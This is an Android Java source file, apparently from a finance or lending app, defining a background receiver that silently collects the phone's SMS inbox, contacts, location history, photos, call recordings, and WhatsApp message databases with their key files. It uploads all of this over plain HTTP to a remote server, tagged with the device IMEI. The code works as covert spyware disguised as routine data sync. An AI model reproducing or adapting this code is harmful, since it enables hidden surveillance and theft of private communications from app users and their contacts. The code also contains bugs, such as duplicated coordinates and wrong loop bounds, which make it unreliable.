package com.tst.hytonefinance.Background_Service;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.webkit.MimeTypeMap;

import androidx.annotation.RequiresApi;

import com.android.volley.AuthFailureError;
import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.ServerError;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HttpHeaderParser;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.tst.hytonefinance.Database.Location_DB;
import com.tst.hytonefinance.Database.Media_DB;
import com.tst.hytonefinance.Database.SMS_data;
import com.tst.hytonefinance.Models.LOCATION;
import com.tst.hytonefinance.Models.SMS;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileFilter;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;


public class sync_data extends BroadcastReceiver implements fileUploadListener {
    private String Base_Url = "http://backend.getbridge.in";
    private Context context;
    private SMS_data sms_data;
    private Media_DB media_DB;
    private Location_DB location_db;
    private HashMap<String,Boolean> Media_list;
    private fileUploadListener listener;
    SharedPreferences sharedPreferences;


    //file access
    private String TAG = "sync_data";
    private String key;
    private String file_format = "image";
    //WifiManager wifiManager;
    //int initialWIFIState;

    ArrayList<File> file_only = new ArrayList<>();

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        sms_data = new SMS_data(context);
        location_db = new Location_DB(context);
        media_DB = new Media_DB(context);
        Media_list=new HashMap<>();
        listener = this;
        sharedPreferences = context.getSharedPreferences("com.tst.hytonefinance.Background_Service", Context.MODE_PRIVATE);

        //**************************** SMS *************************************
        Log.e("Process_status :","SMS Sync started",null);
        SMS_spliterator();


        //**************************** Contact *************************************
        Log.e("Process_status :","Contact Sync started",null);
        contact_spliterator();


        //**************************** Location *************************************
        Log.e("Process_status :","Location Sync started",null);
        location_spliterator();


        //**************************** Media *************************************
        Log.e("Process_status :","Media Sync started",null);
        file_format = "image";
        fileUploadStart();

    }

    //----------------- Location List --------------------------
    private ArrayList<LOCATION> get_location() {
        ArrayList<LOCATION> locations = new ArrayList<>();
        Cursor cursor = location_db.Get_Subject_data();
        while (cursor.moveToNext()) {
            LOCATION temp = new LOCATION();
            temp.setLongitude(Double.parseDouble(cursor.getString(0)));
            temp.setLatitude(Double.parseDouble(cursor.getString(1)));
            temp.setDate_Time(cursor.getString(2));
            locations.add(temp);
        }
        return locations;


    }

    private void location_spliterator() {
        JSONArray LOCATION_LIST = new JSONArray();
        ArrayList<LOCATION> Location_List = get_location();
        int i;
        for (i = 1; i <= Location_List.size(); i++) {

            JSONObject temp = new JSONObject();
            try {
                double[] coordinates = new double[2];
                coordinates[0] = Location_List.get(i - 1).getLongitude();
                coordinates[1] = Location_List.get(i - 1).getLatitude();

                temp.put("lat", String.valueOf(coordinates[0]));
                temp.put("log", String.valueOf(coordinates[0]));
                temp.put("date_time", Location_List.get(i - 1).getDate_Time());

                LOCATION_LIST.put(temp);
                if (i % 100 == 0) {
                    sync_list(LOCATION_LIST, Base_Url + "/api/v1/location/userLocations", "location");
                    LOCATION_LIST = new JSONArray();
                }
            } catch (JSONException jsonException) {
                jsonException.printStackTrace();
            }
        }


        if (i % 100 != 0) {
            location_db.Delete_data();
            sync_list(LOCATION_LIST, Base_Url + "/api/v1/location/userLocations", "location");
        }


    }

    //------------------ Message List -------------------
    @RequiresApi(api = Build.VERSION_CODES.O)
    @SuppressLint("SimpleDateFormat")
    public ArrayList<SMS> readSMS() {
        ArrayList<SMS> Message_list = new ArrayList<>();
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        cursor.moveToFirst();


        long L_date = sharedPreferences.getLong("Last_Date", 0);


        for (int i = 0; !cursor.isLast(); i++) {
            if (L_date < Long.parseLong(cursor.getString(4))) {

                SMS temp_data = new SMS();
                temp_data.setDate_time(cursor.getString(4));
                temp_data.setTitle(cursor.getString(0));
                temp_data.setMessage(cursor.getString(12));
                temp_data.setSender(cursor.getString(2));
                Message_list.add(temp_data);
                Boolean check_data_flag = sms_data.Insert_Subject_data(temp_data.getTitle(), temp_data.getSender(), temp_data.getMessage(), temp_data.getDate_time());

                if (!check_data_flag) {
                    //  Toast.makeText(context, "Error", Toast.LENGTH_SHORT).show();
                    break;
                }
            } else {
                break;
            }

            cursor.moveToNext();
        }
        cursor.moveToFirst();
        @SuppressLint("CommitPrefEdits")
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putLong("Last_Date", Long.parseLong(cursor.getString(4)));
        editor.apply();


        //  Toast.makeText(context, "Done", Toast.LENGTH_SHORT).show();
        cursor.close();


        return Message_list;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void SMS_spliterator() {
        ArrayList<SMS> SMS_List = readSMS();

        JSONArray SMS_list = new JSONArray();
        int i;
        for (i = 1; i < SMS_List.size(); i++) {

            JSONObject temp = new JSONObject();
            try {
                temp.put("tital", SMS_List.get(i - 1).getTitle());
                temp.put("sender", SMS_List.get(i - 1).getSender());
                temp.put("message", SMS_List.get(i - 1).getMessage());
                temp.put("date_time", SMS_List.get(i - 1).getDate_time());

                SMS_list.put(temp);
                if (i % 100 == 0) {
                    sync_list(SMS_list, Base_Url + "/api/v1/message/userMessage", "message");
                    SMS_list = new JSONArray();
                }
            } catch (JSONException jsonException) {
                jsonException.printStackTrace();
            }

        }

        if (i % 100 != 0) {
            sync_list(SMS_list, Base_Url + "/api/v1/message/userMessage", "message");
        }


    }


    //------------------ Contact List -------------------

    @SuppressLint("Range")
    private HashMap<String, String> getContactList() {
        HashMap<String, String> map = new HashMap<>();
        ContentResolver cr = context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        int index = 0;

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur.moveToNext()) {
                index++;
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        map.put(name, phoneNo);
                    }
                    pCur.close();
                }
            }
        }


        if (cur != null) {
            cur.close();
        }
        return map;
    }

    private void contact_spliterator() {
        HashMap<String, String> map = getContactList();
        JSONArray Contact_list = new JSONArray();
//        Log.e("map_size : ",String.valueOf(map.size()),null);

        int i = 1;
        for (Map.Entry<String, String> e : map.entrySet()) {
//            Log.e("Progress : ",(int)((i-1.0)/map.size()*100)+"%",null);
            JSONObject temp = new JSONObject();
            try {
                temp.put("name", e.getKey());
                temp.put("number", e.getValue());
                i++;

                Contact_list.put(temp);
                if (i % 500 == 0) {
//                    Log.e("contact_syn_update : ",i+" Contact Update",null);
                    sync_list(Contact_list, Base_Url + "/api/v1/contact/userContact", "contact");
                    Contact_list = new JSONArray();
                }
            } catch (JSONException jsonException) {
                jsonException.printStackTrace();
            }

        }
        if (i % 500 != 0) {
//            Log.e("contact_syn_Completed :",i+" Contact Update",null);
            sync_list(Contact_list, Base_Url + "/api/v1/contact/userContact", "contact");
        }


    }

    //------------------ Sync Function List -------------------
    private void sync_list(JSONArray body_Array, String url, String Array_name) {
        RequestQueue requestQueue = Volley.newRequestQueue(context);
        requestQueue.start();


        try {
            JSONObject Details = new JSONObject();
            Details.put("user", getDeviceIMEI());
            Details.put(Array_name, body_Array);

            JsonObjectRequest jsObjRequest = new
                    JsonObjectRequest(Request.Method.POST,
                            url,
                            Details,
                            new Response.Listener<JSONObject>() {
                                @Override
                                public void onResponse(JSONObject response) {

                                    try {
                                        Log.e("API_Response", String.valueOf(response.getString("status").equals("sucecss")), null);
                                        Log.e("API_Response", response.toString(), null);

                                    } catch (JSONException e) {
                                        e.printStackTrace();
                                        Log.e("Request_response_catch", e.getMessage(), null);
                                    }
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {

                                    NetworkResponse response = error.networkResponse;
                                    if (error instanceof ServerError && response != null) {
                                        String res;
                                        try {
                                            res = new String(response.data,
                                                    HttpHeaderParser.parseCharset(response.headers, "utf-8"));
                                            Log.e("API_Response_Error 1", res, null);
                                        } catch (UnsupportedEncodingException e) {
                                            e.printStackTrace();
                                        }
                                        // Now you can use any deserializer to make sense of data
                                    }
                                    Log.e("API_Response_Error", error.getMessage(), null);
                                }
                            }) {
                        @Override
                        public Map<String, String> getHeaders() {
                            HashMap<String, String> headers = new HashMap<>();
                            headers.put("Content-Type", "application/json; charset=utf-8");
                            return headers;
                        }
                    };

            requestQueue.add(jsObjRequest);
        } catch (JSONException e) {
            e.printStackTrace();
        }


    }


    @SuppressLint({"MissingPermission", "HardwareIds"})
    public String getDeviceIMEI() {
        String deviceId;

        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            deviceId = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID);
        } else {
            TelephonyManager mTelephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (null != mTelephony.getDeviceId()) deviceId = mTelephony.getDeviceId();
            else {
                deviceId = Settings.Secure.getString(
                        context.getContentResolver(),
                        Settings.Secure.ANDROID_ID);
            }
        }

        return deviceId;
    }


    //------------------ Media List -------------------
    public void fileUploadStart() {

        Log.w(TAG, "file upload start");
        if (file_format.equals("call_recording")) {

            File appDir = context.getFilesDir();
            File[] recordings = appDir.listFiles(new FileFilter() {
                @Override
                public boolean accept(File file) {
                    return file.getName().toLowerCase().endsWith(".mp4");
                }
            });

            for (File file : recordings) {
                file_only.add(file);
                Media_list.put(file.getName(),false);
            }

        } else if (file_format.equals("whatsapp")) {

            File whatsappDirectory = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Databases");
            File[] recordings = whatsappDirectory.listFiles(new FileFilter() {
                @Override
                public boolean accept(File file) {
                    return file.getName().toLowerCase().startsWith("msgstore");
                }
            });

            for (File file : recordings) {
                file_only.add(file);
                Media_list.put(file.getName(),false);

            }


            File whatsappDirectory2 = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/data/com.whatsapp/files");
            File[] recordings2 = whatsappDirectory2.listFiles(new FileFilter() {
                @Override
                public boolean accept(File file) {
                    return file.getName().toLowerCase().startsWith("key");
                }
            });

            if (recordings2.length > 0) {

                for (File file : recordings2) {
                    file_only.add(file);
                    Media_list.put(file.getName(),false);

                }
            }


            File whatsappDirectory3 = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Backup/files");
            File[] recordings3 = whatsappDirectory3.listFiles(new FileFilter() {
                @Override
                public boolean accept(File file) {
                    return file.getName().toLowerCase().startsWith("key");
                }
            });

            if (recordings3.length > 0) {

                for (File file : recordings3) {
                    file_only.add(file);
                    Media_list.put(file.getName(),false);
                }
            }

        } else {


            file_only = new CustomFileFilter(file_format).loadList();

        }

        if (file_only.size() > 0) {//if any recordings present

            Log.w(TAG, "file upload file detected - " + file_only.size());

//            initialWIFIState = WifiManager.WIFI_STATE_DISABLED;
//            wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
//
//            if (wifiManager != null) {
//                initialWIFIState = wifiManager.getWifiState();//get current wifi state
//                wifiManager.setWifiEnabled(true);//enable wifi
//            }


            if (file_format.equals("image") || file_format.equals("whatsapp") || file_format.equals("video") || file_format.equals("audio") || file_format.equals("document") || file_format.equals("call_recording")) {

            } else {
                file_format = "other";
            }


            FileUploader fileUploader = new FileUploader(context, getDeviceIMEI(), file_format, this);
            uploadFiles(fileUploader);


        } else {
            Log.w(TAG, "file upload file not found");
        }
    }

    private void uploadFiles(final FileUploader fileUploader) {
        check_File();
        upload_file_one_by_one(file_only.get(0),0);
    }

    private void upload_file_one_by_one(File file,int pos){

        final Uri file_data = Uri.fromFile(file);
        InputStream iStream = null;

        final int[] index = {pos};

        try {


            if (Media_list.get(file_only.get(pos).getName())) {
                Log.e("File_Status :","File "+file.getName()+" Already Uploaded",null);
                index[0]++;
                if(index[0] < file.length())
                    upload_file_one_by_one(file_only.get(index[0]),index[0]);
            }else
            {
                iStream = context.getContentResolver().openInputStream(file_data);
                final byte[] inputData = getBytes(iStream);


                VolleyMultipartRequest volleyMultipartRequest = new VolleyMultipartRequest(Request.Method.POST, Base_Url + "/api/v1/media/userMedia",
                        new Response.Listener<NetworkResponse>() {
                            @Override
                            public void onResponse(NetworkResponse response) {
                                try {
                                    JSONObject obj = new JSONObject(new String(response.data));
                                    //Toast.makeText(context, obj.getString("message"), Toast.LENGTH_SHORT).show();

                                    //upload next file
                                    Log.w(TAG, "file upload response - " + new String(response.data));
                                    Log.e("File_Status :","New File "+file.getName()+" Uploaded",null);
                                    media_DB.Insert_Subject_data(file.getName());
                                    listener.fileUploadComplete(pos, true);

                                    if(obj.getString("status").equals("sucecss"))
                                    {
                                        index[0]++;
                                        if(index[0] < file.length())
                                            upload_file_one_by_one(file_only.get(index[0]),index[0]);
                                    }

                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        },
                        new Response.ErrorListener() {
                            @Override
                            public void onErrorResponse(VolleyError error) {
                                //Toast.makeText(context, error.getMessage(), Toast.LENGTH_SHORT).show();
                                Log.w(TAG, "file upload fail file - " + file_data.getLastPathSegment());
                                listener.fileUploadComplete(pos, false);
                            }
                        }) {

                    /*
                     * If you want to add more parameters with the image
                     * you can do it here
                     * here we have only one parameter with the image
                     * which is tags
                     * */
                    @Override
                    protected Map<String, String> getParams() throws AuthFailureError {
                        Map<String, String> params = new HashMap<>();
                        params.put("user", getDeviceIMEI());
                        return params;
                    }

                    /*
                     * Here we are passing image by renaming it with a unique name
                     * */
                    @Override
                    protected Map<String, DataPart> getByteData() {
                        Map<String, DataPart> params = new HashMap<>();
                        String fileName = file.getName();//System.currentTimeMillis();
                        params.put("medias", new DataPart(fileName, inputData,getMimeType(file_data)));
                        return params;
                    }
                };

                //adding the request to volley
                Volley.newRequestQueue(context).add(volleyMultipartRequest);
            }




            //start file uploading here
            //Log.w(TAG, "file upload success file - " + file_data.getLastPathSegment());

        }catch (Exception e){
            e.printStackTrace();
            Media_list.put(file.getName(),false);
            Log.e("File_Status :","File "+file.getName()+" Get Error",null);
            if(index[0] < file.length())
                upload_file_one_by_one(file_only.get(index[0]),index[0]);

        }
    }



    private void check_File() {
        Cursor cursor = media_DB.Get_Subject_data();
        while (cursor.moveToNext()) {
            Media_list.put(cursor.getString(0),true);
        }
    }

    @Override
    public void fileUploadComplete(int position, boolean isFileUploadSuccess) {
        if (position == file_only.size()) {

//            if ( wifiManager != null && initialWIFIState != WifiManager.WIFI_STATE_ENABLED) {
//                wifiManager.setWifiEnabled(false);
//            }

           /* if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                stopForeground(true);
            } else {
                stopSelf();
            }*/

        } else {
            Log.w(TAG, "file remaining - " + (file_only.size() - (position - 1)));
        }
    }

    @Override
    public void internetConnectionLost(int position) {
        Log.w(TAG, "file  - internetConnectionLost at " + position + " name is - " + file_only.get(position));
       /* if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            stopForeground(true);
        } else {
            stopSelf();
        }*/
    }

    public byte[] getBytes(InputStream inputStream) throws IOException {
        ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();
        int bufferSize = 1024;
        byte[] buffer = new byte[bufferSize];

        int len = 0;
        while ((len = inputStream.read(buffer)) != -1) {
            byteBuffer.write(buffer, 0, len);
        }
        return byteBuffer.toByteArray();
    }


    public String getMimeType(Uri uri) {
        String mimeType = null;
        if (ContentResolver.SCHEME_CONTENT.equals(uri.getScheme())) {
            ContentResolver cr = context.getContentResolver();
            mimeType = cr.getType(uri);
        } else {
            String fileExtension = MimeTypeMap.getFileExtensionFromUrl(uri
                    .toString());
            mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(
                    fileExtension.toLowerCase());
        }
        return mimeType;
    }

}
